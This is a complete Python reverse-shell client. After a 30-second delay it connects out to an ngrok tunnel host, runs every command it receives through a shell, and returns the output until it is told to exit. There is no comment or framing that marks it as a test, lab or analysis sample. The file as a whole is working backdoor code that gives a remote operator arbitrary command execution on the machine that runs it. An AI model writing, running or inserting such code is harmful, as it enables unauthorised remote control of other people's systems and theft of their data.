import socket
import subprocess
from time import sleep
sleep(30)
def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client_socket.connect(('5.tcp.ngrok.io', 20545))
        finally:
            break
    print("Connected to server. Waiting for commands...")

    while True:
        command = client_socket.recv(1024).decode()
        
        if command.lower() == "exit":
            break

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                response = result.stdout
            else:
                response = result.stderr
        except Exception as e:
            response = f"Error executing command: {e}"

        client_socket.send(response.encode())

    client_socket.close()

if __name__ == '__main__':
    start_client()
